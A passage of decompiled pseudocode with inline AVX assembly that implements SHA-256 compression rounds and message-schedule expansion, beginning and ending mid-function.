        v1557 = v1556 + v1492;
        v1721 = (v1804 ^ (v1804 ^ v1762) & (v1846 ^ v1804))
              + v1492
              + (__ROR4__(v1762, 2) ^ __ROR4__(v1762, 13) ^ __ROR4__(v1762, 22));
        v1493 = v1875
              + v1679
              + (v1636 & ~v1557 | v1595 & v1557)
              + (__ROR4__(v1557, 25) ^ __ROR4__(v1557, 11) ^ __ROR4__(v1557, 6));
        v1847 = v1846 + v1493;
        v1680 = (v1762 ^ (v1762 ^ v1721) & (v1804 ^ v1762))
              + v1493
              + (__ROR4__(v1721, 2) ^ __ROR4__(v1721, 13) ^ __ROR4__(v1721, 22));
        v1494 = DWORD1(v1875)
              + v1636
              + (v1595 & ~v1847 | v1557 & v1847)
              + (__ROR4__(v1847, 25) ^ __ROR4__(v1847, 11) ^ __ROR4__(v1847, 6));
        v1805 = v1804 + v1494;
        v1637 = (v1721 ^ (v1721 ^ v1680) & (v1762 ^ v1721))
              + v1494
              + (__ROR4__(v1680, 2) ^ __ROR4__(v1680, 13) ^ __ROR4__(v1680, 22));
        v1495 = DWORD2(v1875)
              + v1595
              + (v1557 & ~v1805 | v1847 & v1805)
              + (__ROR4__(v1805, 25) ^ __ROR4__(v1805, 11) ^ __ROR4__(v1805, 6));
        v1763 = v1762 + v1495;
        v1596 = (v1680 ^ (v1680 ^ v1637) & (v1721 ^ v1680))
              + v1495
              + (__ROR4__(v1637, 2) ^ __ROR4__(v1637, 13) ^ __ROR4__(v1637, 22));
        v1496 = HIDWORD(v1875)
              + v1557
              + (v1847 & ~v1763 | v1805 & v1763)
              + (__ROR4__(v1763, 25) ^ __ROR4__(v1763, 11) ^ __ROR4__(v1763, 6));
        v1722 = v1721 + v1496;
        v1558 = (v1637 ^ (v1637 ^ v1596) & (v1680 ^ v1637))
              + v1496
              + (__ROR4__(v1596, 2) ^ __ROR4__(v1596, 13) ^ __ROR4__(v1596, 22));
        v1497 = v1895
              + v1847
              + (v1805 & ~v1722 | v1763 & v1722)
              + (__ROR4__(v1722, 25) ^ __ROR4__(v1722, 11) ^ __ROR4__(v1722, 6));
        v1681 = v1680 + v1497;
        v1848 = (v1596 ^ (v1596 ^ v1558) & (v1637 ^ v1596))
              + v1497
              + (__ROR4__(v1558, 2) ^ __ROR4__(v1558, 13) ^ __ROR4__(v1558, 22));
        v1498 = DWORD1(v1895)
              + v1805
              + (v1763 & ~v1681 | v1722 & v1681)
              + (__ROR4__(v1681, 25) ^ __ROR4__(v1681, 11) ^ __ROR4__(v1681, 6));
        v1638 = v1637 + v1498;
        v1806 = (v1558 ^ (v1558 ^ v1848) & (v1596 ^ v1558))
              + v1498
              + (__ROR4__(v1848, 2) ^ __ROR4__(v1848, 13) ^ __ROR4__(v1848, 22));
        v1499 = DWORD2(v1895)
              + v1763
              + (v1722 & ~v1638 | v1681 & v1638)
              + (__ROR4__(v1638, 25) ^ __ROR4__(v1638, 11) ^ __ROR4__(v1638, 6));
        v1597 = v1596 + v1499;
        v1764 = (v1848 ^ (v1848 ^ v1806) & (v1558 ^ v1848))
              + v1499
              + (__ROR4__(v1806, 2) ^ __ROR4__(v1806, 13) ^ __ROR4__(v1806, 22));
        v1500 = HIDWORD(v1895)
              + v1722
              + (v1681 & ~v1597 | v1638 & v1597)
              + (__ROR4__(v1597, 25) ^ __ROR4__(v1597, 11) ^ __ROR4__(v1597, 6));
        v1559 = v1558 + v1500;
        v1723 = (v1806 ^ (v1806 ^ v1764) & (v1848 ^ v1806))
              + v1500
              + (__ROR4__(v1764, 2) ^ __ROR4__(v1764, 13) ^ __ROR4__(v1764, 22));
        v1501 = v1915
              + v1681
              + (v1638 & ~v1559 | v1597 & v1559)
              + (__ROR4__(v1559, 25) ^ __ROR4__(v1559, 11) ^ __ROR4__(v1559, 6));
        v1849 = v1848 + v1501;
        v1682 = (v1764 ^ (v1764 ^ v1723) & (v1806 ^ v1764))
              + v1501
              + (__ROR4__(v1723, 2) ^ __ROR4__(v1723, 13) ^ __ROR4__(v1723, 22));
        v1502 = DWORD1(v1915)
              + v1638
              + (v1597 & ~v1849 | v1559 & v1849)
              + (__ROR4__(v1849, 25) ^ __ROR4__(v1849, 11) ^ __ROR4__(v1849, 6));
        v1807 = v1806 + v1502;
        v1639 = (v1723 ^ (v1723 ^ v1682) & (v1764 ^ v1723))
              + v1502
              + (__ROR4__(v1682, 2) ^ __ROR4__(v1682, 13) ^ __ROR4__(v1682, 22));
        v1503 = DWORD2(v1915)
              + v1597
              + (v1559 & ~v1807 | v1849 & v1807)
              + (__ROR4__(v1807, 25) ^ __ROR4__(v1807, 11) ^ __ROR4__(v1807, 6));
        v1504 = (v1682 ^ (v1682 ^ v1639) & (v1723 ^ v1682))
              + v1503
              + (__ROR4__(v1639, 2) ^ __ROR4__(v1639, 13) ^ __ROR4__(v1639, 22));
        v1765 = v1764 + v1503;
        v1505 = __ROR4__(v1504, 2);
        v1506 = __ROR4__(v1504, 13);
        v1507 = __ROR4__(v1504, 22);
        v1508 = v1639 ^ v1504;
        v1509 = HIDWORD(v1915)
              + v1559
              + (v1849 & ~v1765 | v1807 & v1765)
              + (__ROR4__(v1765, 25) ^ __ROR4__(v1765, 11) ^ __ROR4__(v1765, 6));
        result = v1933->m128i_i32[0] + (v1639 ^ v1508 & (v1682 ^ v1639)) + v1509 + (v1505 ^ v1506 ^ v1507);
        v1510 = v1933->m128i_i32[1] + (v1639 ^ v1508);
        v1511 = v1933->m128i_i32[2] + v1639;
        v1512 = v1933->m128i_i32[3] + v1682;
        v1933->m128i_i32[0] = result;
        v1933->m128i_i32[1] = v1510;
        v1933->m128i_i32[2] = v1511;
        v1933->m128i_i32[3] = v1512;
        v1591 = v1510;
        v1324 = v1511 ^ v1510;
        v1632 = v1511;
        v1675 = v1512;
        v1325 = v1933[1].m128i_i32[0] + v1723 + v1509;
        v1513 = v1933[1].m128i_i32[1] + v1765;
        v1514 = v1933[1].m128i_i32[2] + v1807;
        v1933[1].m128i_i32[0] = v1325;
        v1933[1].m128i_i32[1] = v1513;
        v1758 = v1513;
        v1933[1].m128i_i32[2] = v1514;
        v1515 = v1933[1].m128i_i32[3] + v1849;
        v1800 = v1514;
        v1933[1].m128i_i32[3] = v1515;
        v1842 = v1515;
        _EDI = (const __m128i *)v1930;
        __asm { vmovdqa xmm7, xmmword ptr [ebp+40h] }
        _EBP -= 12;
      }
      while ( v1930 < v1931 );
      __asm { vzeroall }
    }
    else
    {
      __asm { vzeroall }
      result = v1933->m128i_i32[0];
      v1584 = v1933->m128i_i32[1];
      v985 = v1933->m128i_i32[2] ^ v1584;
      v1624 = v1933->m128i_i32[2];
      v1667 = v1933->m128i_i32[3];
      v986 = v1933[1].m128i_i32[0];
      v1750 = v1933[1].m128i_i32[1];
      _EDI = v1934;
      v1792 = v1933[1].m128i_i32[2];
      v1834 = v1933[1].m128i_i32[3];
      __asm { vmovdqa xmm7, xmmword ptr [ebp+100h] }
      do
      {
        __asm
        {
          vmovdqu xmm0, xmmword ptr [edi]
          vmovdqu xmm1, xmmword ptr [edi+10h]
          vmovdqu xmm2, xmmword ptr [edi+20h]
          vmovdqu xmm3, xmmword ptr [edi+30h]
          vpshufb xmm0, xmm0, xmm7
        }
        v1929 = (unsigned int)&_EDI[4];
        __asm
        {
          vpshufb xmm1, xmm1, xmm7
          vpshufb xmm2, xmm2, xmm7
          vpaddd  xmm4, xmm0, xmmword ptr [ebp+0]
          vpshufb xmm3, xmm3, xmm7
          vpaddd  xmm5, xmm1, xmmword ptr [ebp+10h]
          vpaddd  xmm6, xmm2, xmmword ptr [ebp+20h]
          vpaddd  xmm7, xmm3, xmmword ptr [ebp+30h]
          vmovdqa [esp+80h+var_60], xmm4
          vmovdqa [esp+80h+var_50], xmm5
          vmovdqa [esp+80h+var_40], xmm6
          vmovdqa [esp+80h+var_30], xmm7
        }
        do
        {
          _EBP += 4;
          __asm { vpalignr xmm4, xmm1, xmm0, 4 }
          LODWORD(v1002) = v986;
          HIDWORD(v1002) = v986;
          __asm
          {
            vpalignr xmm7, xmm3, xmm2, 4
            vpsrld  xmm6, xmm4, 7
          }
          LODWORD(v1002) = v986 ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1708 = v986;
          __asm { vpaddd  xmm0, xmm0, xmm7 }
          LODWORD(v1002) = v986 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          __asm { vpsrld  xmm7, xmm4, 3 }
          v1007 = (v986 & (v1792 ^ v1750) ^ v1792) + (v1002 >> 6);
          __asm { vpslld  xmm5, xmm4, 0Eh }
          v1009 = result;
          LODWORD(v1002) = result;
          HIDWORD(v1002) = result;
          v1544 = result;
          __asm { vpxor   xmm4, xmm7, xmm6 }
          v1011 = result ^ (v1002 >> 9);
          v1012 = v1584 ^ result;
          __asm { vpshufd xmm7, xmm3, 0FAh }
          LODWORD(v1002) = v1011;
          HIDWORD(v1002) = v1011;
          __asm { vpsrld  xmm6, xmm6, 0Bh }
          v1015 = v1855 + v1834 + v1007;
          LODWORD(v1002) = v1009 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          __asm { vpxor   xmm4, xmm4, xmm5 }
          v1017 = (v1002 >> 2) + v1015 + (v1584 ^ v1012 & v985);
          __asm { vpslld  xmm5, xmm5, 0Bh }
          LODWORD(v1002) = v1667 + v1015;
          HIDWORD(v1002) = v1667 + v1015;
          __asm
          {
            vpxor   xmm4, xmm4, xmm6
            vpsrld  xmm6, xmm7, 0Ah
          }
          LODWORD(v1002) = (v1667 + v1015) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1668 = v1667 + v1015;
          __asm { vpxor   xmm4, xmm4, xmm5 }
          LODWORD(v1002) = v1668 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          __asm { vpsrlq  xmm5, xmm7, 11h }
          v1023 = (v1668 & (v1750 ^ v1708) ^ v1750) + (v1002 >> 6);
          __asm { vpaddd  xmm0, xmm0, xmm4 }
          v1025 = v1017;
          LODWORD(v1002) = v1017;
          HIDWORD(v1002) = v1017;
          v1835 = v1017;
          __asm { vpxor   xmm6, xmm6, xmm5 }
          v1027 = v1017 ^ (v1002 >> 9);
          v1028 = v1544 ^ v1017;
          __asm { vpsrlq  xmm7, xmm7, 13h }
          LODWORD(v1002) = v1027;
          HIDWORD(v1002) = v1027;
          __asm { vpxor   xmm6, xmm6, xmm7 }
          v1031 = DWORD1(v1855) + v1792 + v1023;
          LODWORD(v1002) = v1025 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          __asm { vpshufd xmm7, xmm6, 84h }
          v1033 = (v1002 >> 2) + v1031 + (v1544 ^ v1028 & v1012);
          __asm { vpsrldq xmm7, xmm7, 8 }
          LODWORD(v1002) = v1624 + v1031;
          HIDWORD(v1002) = v1624 + v1031;
          __asm
          {
            vpaddd  xmm0, xmm0, xmm7
            vpshufd xmm7, xmm0, 50h ; 'P'
          }
          LODWORD(v1002) = (v1624 + v1031) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1625 = v1624 + v1031;
          __asm { vpsrld  xmm6, xmm7, 0Ah }
          LODWORD(v1002) = v1625 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          __asm { vpsrlq  xmm5, xmm7, 11h }
          v1039 = (v1625 & (v1708 ^ v1668) ^ v1708) + (v1002 >> 6);
          __asm { vpxor   xmm6, xmm6, xmm5 }
          v1041 = v1033;
          LODWORD(v1002) = v1033;
          HIDWORD(v1002) = v1033;
          v1793 = v1033;
          __asm { vpsrlq  xmm7, xmm7, 13h }
          v1043 = v1033 ^ (v1002 >> 9);
          v1044 = v1835 ^ v1033;
          __asm { vpxor   xmm6, xmm6, xmm7 }
          LODWORD(v1002) = v1043;
          HIDWORD(v1002) = v1043;
          __asm { vpshufd xmm7, xmm6, 0E8h }
          v1047 = DWORD2(v1855) + v1750 + v1039;
          LODWORD(v1002) = v1041 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          __asm { vpslldq xmm7, xmm7, 8 }
          v1049 = (v1002 >> 2) + v1047 + (v1835 ^ v1044 & v1028);
          __asm { vpaddd  xmm0, xmm0, xmm7 }
          LODWORD(v1002) = v1584 + v1047;
          HIDWORD(v1002) = v1584 + v1047;
          __asm { vpaddd  xmm6, xmm0, xmmword ptr [ebp+0] }
          LODWORD(v1002) = (v1584 + v1047) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1585 = v1584 + v1047;
          LODWORD(v1002) = v1585 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          v1051 = (v1585 & (v1668 ^ v1625) ^ v1668) + (v1002 >> 6);
          v1052 = v1049;
          LODWORD(v1002) = v1049;
          HIDWORD(v1002) = v1049;
          v1751 = v1049;
          v1053 = v1049 ^ (v1002 >> 9);
          v1054 = v1793 ^ v1049;
          LODWORD(v1002) = v1053;
          HIDWORD(v1002) = v1053;
          v1055 = HIDWORD(v1855) + v1708 + v1051;
          LODWORD(v1002) = v1052 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          v1056 = (v1002 >> 2) + v1055 + (v1793 ^ v1054 & v1044);
          __asm
          {
            vmovdqa [esp+80h+var_60], xmm6
            vpalignr xmm4, xmm2, xmm1, 4
          }
          LODWORD(v1002) = v1544 + v1055;
          HIDWORD(v1002) = v1544 + v1055;
          __asm
          {
            vpalignr xmm7, xmm0, xmm3, 4
            vpsrld  xmm6, xmm4, 7
          }
          LODWORD(v1002) = (v1544 + v1055) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1545 = v1544 + v1055;
          __asm { vpaddd  xmm1, xmm1, xmm7 }
          LODWORD(v1002) = v1545 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          __asm { vpsrld  xmm7, xmm4, 3 }
          v1062 = (v1545 & (v1625 ^ v1585) ^ v1625) + (v1002 >> 6);
          __asm { vpslld  xmm5, xmm4, 0Eh }
          v1064 = v1056;
          LODWORD(v1002) = v1056;
          HIDWORD(v1002) = v1056;
          v1709 = v1056;
          __asm { vpxor   xmm4, xmm7, xmm6 }
          v1066 = v1056 ^ (v1002 >> 9);
          v1067 = v1751 ^ v1056;
          __asm { vpshufd xmm7, xmm0, 0FAh }
          LODWORD(v1002) = v1066;
          HIDWORD(v1002) = v1066;
          __asm { vpsrld  xmm6, xmm6, 0Bh }
          v1070 = v1874 + v1668 + v1062;
          LODWORD(v1002) = v1064 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          __asm { vpxor   xmm4, xmm4, xmm5 }
          v1072 = (v1002 >> 2) + v1070 + (v1751 ^ v1067 & v1054);
          __asm { vpslld  xmm5, xmm5, 0Bh }
          LODWORD(v1002) = v1835 + v1070;
          HIDWORD(v1002) = v1835 + v1070;
          __asm
          {
            vpxor   xmm4, xmm4, xmm6
            vpsrld  xmm6, xmm7, 0Ah
          }
          LODWORD(v1002) = (v1835 + v1070) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1836 = v1835 + v1070;
          __asm { vpxor   xmm4, xmm4, xmm5 }
          LODWORD(v1002) = v1836 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          __asm { vpsrlq  xmm5, xmm7, 11h }
          v1078 = (v1836 & (v1585 ^ v1545) ^ v1585) + (v1002 >> 6);
          __asm { vpaddd  xmm1, xmm1, xmm4 }
          v1080 = v1072;
          LODWORD(v1002) = v1072;
          HIDWORD(v1002) = v1072;
          v1669 = v1072;
          __asm { vpxor   xmm6, xmm6, xmm5 }
          v1082 = v1072 ^ (v1002 >> 9);
          v1083 = v1709 ^ v1072;
          __asm { vpsrlq  xmm7, xmm7, 13h }
          LODWORD(v1002) = v1082;
          HIDWORD(v1002) = v1082;
          __asm { vpxor   xmm6, xmm6, xmm7 }
          v1086 = DWORD1(v1874) + v1625 + v1078;
          LODWORD(v1002) = v1080 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          __asm { vpshufd xmm7, xmm6, 84h }
          v1088 = (v1002 >> 2) + v1086 + (v1709 ^ v1083 & v1067);
          __asm { vpsrldq xmm7, xmm7, 8 }
          LODWORD(v1002) = v1793 + v1086;
          HIDWORD(v1002) = v1793 + v1086;
          __asm
          {
            vpaddd  xmm1, xmm1, xmm7
            vpshufd xmm7, xmm1, 50h ; 'P'
          }
          LODWORD(v1002) = (v1793 + v1086) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1794 = v1793 + v1086;
          __asm { vpsrld  xmm6, xmm7, 0Ah }
          LODWORD(v1002) = v1794 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          __asm { vpsrlq  xmm5, xmm7, 11h }
          v1094 = (v1794 & (v1545 ^ v1836) ^ v1545) + (v1002 >> 6);
          __asm { vpxor   xmm6, xmm6, xmm5 }
          v1096 = v1088;
          LODWORD(v1002) = v1088;
          HIDWORD(v1002) = v1088;
          v1626 = v1088;
          __asm { vpsrlq  xmm7, xmm7, 13h }
          v1098 = v1088 ^ (v1002 >> 9);
          v1099 = v1669 ^ v1088;
          __asm { vpxor   xmm6, xmm6, xmm7 }
          LODWORD(v1002) = v1098;
          HIDWORD(v1002) = v1098;
          __asm { vpshufd xmm7, xmm6, 0E8h }
          v1102 = DWORD2(v1874) + v1585 + v1094;
          LODWORD(v1002) = v1096 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          __asm { vpslldq xmm7, xmm7, 8 }
          v1104 = (v1002 >> 2) + v1102 + (v1669 ^ v1099 & v1083);
          __asm { vpaddd  xmm1, xmm1, xmm7 }
          LODWORD(v1002) = v1751 + v1102;
          HIDWORD(v1002) = v1751 + v1102;
          __asm { vpaddd  xmm6, xmm1, xmmword ptr [ebp+10h] }
          LODWORD(v1002) = (v1751 + v1102) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1752 = v1751 + v1102;
          LODWORD(v1002) = v1752 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          v1106 = (v1752 & (v1836 ^ v1794) ^ v1836) + (v1002 >> 6);
          v1107 = v1104;
          LODWORD(v1002) = v1104;
          HIDWORD(v1002) = v1104;
          v1586 = v1104;
          v1108 = v1104 ^ (v1002 >> 9);
          v1109 = v1626 ^ v1104;
          LODWORD(v1002) = v1108;
          HIDWORD(v1002) = v1108;
          v1110 = HIDWORD(v1874) + v1545 + v1106;
          LODWORD(v1002) = v1107 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          v1111 = (v1002 >> 2) + v1110 + (v1626 ^ v1109 & v1099);
          __asm
          {
            vmovdqa [esp+80h+var_50], xmm6
            vpalignr xmm4, xmm3, xmm2, 4
          }
          LODWORD(v1002) = v1709 + v1110;
          HIDWORD(v1002) = v1709 + v1110;
          __asm
          {
            vpalignr xmm7, xmm1, xmm0, 4
            vpsrld  xmm6, xmm4, 7
          }
          LODWORD(v1002) = (v1709 + v1110) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1710 = v1709 + v1110;
          __asm { vpaddd  xmm2, xmm2, xmm7 }
          LODWORD(v1002) = v1710 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          __asm { vpsrld  xmm7, xmm4, 3 }
          v1117 = (v1710 & (v1794 ^ v1752) ^ v1794) + (v1002 >> 6);
          __asm { vpslld  xmm5, xmm4, 0Eh }
          v1119 = v1111;
          LODWORD(v1002) = v1111;
          HIDWORD(v1002) = v1111;
          v1546 = v1111;
          __asm { vpxor   xmm4, xmm7, xmm6 }
          v1121 = v1111 ^ (v1002 >> 9);
          v1122 = v1586 ^ v1111;
          __asm { vpshufd xmm7, xmm1, 0FAh }
          LODWORD(v1002) = v1121;
          HIDWORD(v1002) = v1121;
          __asm { vpsrld  xmm6, xmm6, 0Bh }
          v1125 = v1894 + v1836 + v1117;
          LODWORD(v1002) = v1119 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          __asm { vpxor   xmm4, xmm4, xmm5 }
          v1127 = (v1002 >> 2) + v1125 + (v1586 ^ v1122 & v1109);
          __asm { vpslld  xmm5, xmm5, 0Bh }
          LODWORD(v1002) = v1669 + v1125;
          HIDWORD(v1002) = v1669 + v1125;
          __asm
          {
            vpxor   xmm4, xmm4, xmm6
            vpsrld  xmm6, xmm7, 0Ah
          }
          LODWORD(v1002) = (v1669 + v1125) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1670 = v1669 + v1125;
          __asm { vpxor   xmm4, xmm4, xmm5 }
          LODWORD(v1002) = v1670 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          __asm { vpsrlq  xmm5, xmm7, 11h }
          v1133 = (v1670 & (v1752 ^ v1710) ^ v1752) + (v1002 >> 6);
          __asm { vpaddd  xmm2, xmm2, xmm4 }
          v1135 = v1127;
          LODWORD(v1002) = v1127;
          HIDWORD(v1002) = v1127;
          v1837 = v1127;
          __asm { vpxor   xmm6, xmm6, xmm5 }
          v1137 = v1127 ^ (v1002 >> 9);
          v1138 = v1546 ^ v1127;
          __asm { vpsrlq  xmm7, xmm7, 13h }
          LODWORD(v1002) = v1137;
          HIDWORD(v1002) = v1137;
          __asm { vpxor   xmm6, xmm6, xmm7 }
          v1141 = DWORD1(v1894) + v1794 + v1133;
          LODWORD(v1002) = v1135 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          __asm { vpshufd xmm7, xmm6, 84h }
          v1143 = (v1002 >> 2) + v1141 + (v1546 ^ v1138 & v1122);
          __asm { vpsrldq xmm7, xmm7, 8 }
          LODWORD(v1002) = v1626 + v1141;
          HIDWORD(v1002) = v1626 + v1141;
          __asm
          {
            vpaddd  xmm2, xmm2, xmm7
            vpshufd xmm7, xmm2, 50h ; 'P'
          }
          LODWORD(v1002) = (v1626 + v1141) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1627 = v1626 + v1141;
          __asm { vpsrld  xmm6, xmm7, 0Ah }
          LODWORD(v1002) = v1627 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          __asm { vpsrlq  xmm5, xmm7, 11h }
          v1149 = (v1627 & (v1710 ^ v1670) ^ v1710) + (v1002 >> 6);
          __asm { vpxor   xmm6, xmm6, xmm5 }
          v1151 = v1143;
          LODWORD(v1002) = v1143;
          HIDWORD(v1002) = v1143;
          v1795 = v1143;
          __asm { vpsrlq  xmm7, xmm7, 13h }
          v1153 = v1143 ^ (v1002 >> 9);
          v1154 = v1837 ^ v1143;
          __asm { vpxor   xmm6, xmm6, xmm7 }
          LODWORD(v1002) = v1153;
          HIDWORD(v1002) = v1153;
          __asm { vpshufd xmm7, xmm6, 0E8h }
          v1157 = DWORD2(v1894) + v1752 + v1149;
          LODWORD(v1002) = v1151 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          __asm { vpslldq xmm7, xmm7, 8 }
          v1159 = (v1002 >> 2) + v1157 + (v1837 ^ v1154 & v1138);
          __asm { vpaddd  xmm2, xmm2, xmm7 }
          LODWORD(v1002) = v1586 + v1157;
          HIDWORD(v1002) = v1586 + v1157;
          __asm { vpaddd  xmm6, xmm2, xmmword ptr [ebp+20h] }
          LODWORD(v1002) = (v1586 + v1157) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1587 = v1586 + v1157;
          LODWORD(v1002) = v1587 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          v1161 = (v1587 & (v1670 ^ v1627) ^ v1670) + (v1002 >> 6);
          v1162 = v1159;
          LODWORD(v1002) = v1159;
          HIDWORD(v1002) = v1159;
          v1753 = v1159;
          v1163 = v1159 ^ (v1002 >> 9);
          v1164 = v1795 ^ v1159;
          LODWORD(v1002) = v1163;
          HIDWORD(v1002) = v1163;
          v1165 = HIDWORD(v1894) + v1710 + v1161;
          LODWORD(v1002) = v1162 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          v1166 = (v1002 >> 2) + v1165 + (v1795 ^ v1164 & v1154);
          __asm
          {
            vmovdqa [esp+80h+var_40], xmm6
            vpalignr xmm4, xmm0, xmm3, 4
          }
          LODWORD(v1002) = v1546 + v1165;
          HIDWORD(v1002) = v1546 + v1165;
          __asm
          {
            vpalignr xmm7, xmm2, xmm1, 4
            vpsrld  xmm6, xmm4, 7
          }
          LODWORD(v1002) = (v1546 + v1165) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1547 = v1546 + v1165;
          __asm { vpaddd  xmm3, xmm3, xmm7 }
          LODWORD(v1002) = v1547 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          __asm { vpsrld  xmm7, xmm4, 3 }
          v1172 = (v1547 & (v1627 ^ v1587) ^ v1627) + (v1002 >> 6);
          __asm { vpslld  xmm5, xmm4, 0Eh }
          v1174 = v1166;
          LODWORD(v1002) = v1166;
          HIDWORD(v1002) = v1166;
          v1711 = v1166;
          __asm { vpxor   xmm4, xmm7, xmm6 }
          v1176 = v1166 ^ (v1002 >> 9);
          v1177 = v1753 ^ v1166;
          __asm { vpshufd xmm7, xmm2, 0FAh }
          LODWORD(v1002) = v1176;
          HIDWORD(v1002) = v1176;
          __asm { vpsrld  xmm6, xmm6, 0Bh }
          v1180 = v1914 + v1670 + v1172;
          LODWORD(v1002) = v1174 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          __asm { vpxor   xmm4, xmm4, xmm5 }
          v1182 = (v1002 >> 2) + v1180 + (v1753 ^ v1177 & v1164);
          __asm { vpslld  xmm5, xmm5, 0Bh }
          LODWORD(v1002) = v1837 + v1180;
          HIDWORD(v1002) = v1837 + v1180;
          __asm
          {
            vpxor   xmm4, xmm4, xmm6
            vpsrld  xmm6, xmm7, 0Ah
          }
          LODWORD(v1002) = (v1837 + v1180) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1834 = v1837 + v1180;
          __asm { vpxor   xmm4, xmm4, xmm5 }
          LODWORD(v1002) = v1834 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          __asm { vpsrlq  xmm5, xmm7, 11h }
          v1188 = (v1834 & (v1587 ^ v1547) ^ v1587) + (v1002 >> 6);
          __asm { vpaddd  xmm3, xmm3, xmm4 }
          v1190 = v1182;
          LODWORD(v1002) = v1182;
          HIDWORD(v1002) = v1182;
          v1667 = v1182;
          __asm { vpxor   xmm6, xmm6, xmm5 }
          v1192 = v1182 ^ (v1002 >> 9);
          v1193 = v1711 ^ v1182;
          __asm { vpsrlq  xmm7, xmm7, 13h }
          LODWORD(v1002) = v1192;
          HIDWORD(v1002) = v1192;
          __asm { vpxor   xmm6, xmm6, xmm7 }
          v1196 = DWORD1(v1914) + v1627 + v1188;
          LODWORD(v1002) = v1190 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          __asm { vpshufd xmm7, xmm6, 84h }
          v1198 = (v1002 >> 2) + v1196 + (v1711 ^ v1193 & v1177);
          __asm { vpsrldq xmm7, xmm7, 8 }
          LODWORD(v1002) = v1795 + v1196;
          HIDWORD(v1002) = v1795 + v1196;
          __asm
          {
            vpaddd  xmm3, xmm3, xmm7
            vpshufd xmm7, xmm3, 50h ; 'P'
          }
          LODWORD(v1002) = (v1795 + v1196) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1792 = v1795 + v1196;
          __asm { vpsrld  xmm6, xmm7, 0Ah }
          LODWORD(v1002) = v1792 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          __asm { vpsrlq  xmm5, xmm7, 11h }
          v1204 = (v1792 & (v1547 ^ v1834) ^ v1547) + (v1002 >> 6);
          __asm { vpxor   xmm6, xmm6, xmm5 }
          v1206 = v1198;
          LODWORD(v1002) = v1198;
          HIDWORD(v1002) = v1198;
          v1624 = v1198;
          __asm { vpsrlq  xmm7, xmm7, 13h }
          v1208 = v1198 ^ (v1002 >> 9);
          v1209 = v1667 ^ v1198;
          __asm { vpxor   xmm6, xmm6, xmm7 }
          LODWORD(v1002) = v1208;
          HIDWORD(v1002) = v1208;
          __asm { vpshufd xmm7, xmm6, 0E8h }
          v1212 = DWORD2(v1914) + v1587 + v1204;
          LODWORD(v1002) = v1206 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          __asm { vpslldq xmm7, xmm7, 8 }
          v1214 = (v1002 >> 2) + v1212 + (v1667 ^ v1209 & v1193);
          __asm { vpaddd  xmm3, xmm3, xmm7 }
          LODWORD(v1002) = v1753 + v1212;
          HIDWORD(v1002) = v1753 + v1212;
          __asm { vpaddd  xmm6, xmm3, xmmword ptr [ebp+30h] }
          LODWORD(v1002) = (v1753 + v1212) ^ (v1002 >> 14);
          HIDWORD(v1002) = v1002;
          v1750 = v1753 + v1212;
          LODWORD(v1002) = v1750 ^ (v1002 >> 5);
          HIDWORD(v1002) = v1002;
          v1216 = (v1750 & (v1834 ^ v1792) ^ v1834) + (v1002 >> 6);
          v1217 = v1214;
          LODWORD(v1002) = v1214;
          HIDWORD(v1002) = v1214;
          v1584 = v1214;
          v1218 = v1214 ^ (v1002 >> 9);
          v985 = v1624 ^ v1214;
          LODWORD(v1002) = v1218;
          HIDWORD(v1002) = v1218;
          v1219 = HIDWORD(v1914) + v1547 + v1216;
          LODWORD(v1002) = v1217 ^ (v1002 >> 11);
          HIDWORD(v1002) = v1002;
          v1220 = v1219 + (v1624 ^ v985 & v1209);
          v986 = v1711 + v1219;
          result = (v1002 >> 2) + v1220;
          __asm { vmovdqa [esp+80h+var_30], xmm6 }
        }
        while ( _EBP[4].m128i_i32[0] != 66051 );
        LODWORD(v1221) = v986;
        HIDWORD(v1221) = v986;
        LODWORD(v1221) = v986 ^ (v1221 >> 14);
        HIDWORD(v1221) = v1221;
        v1712 = v986;
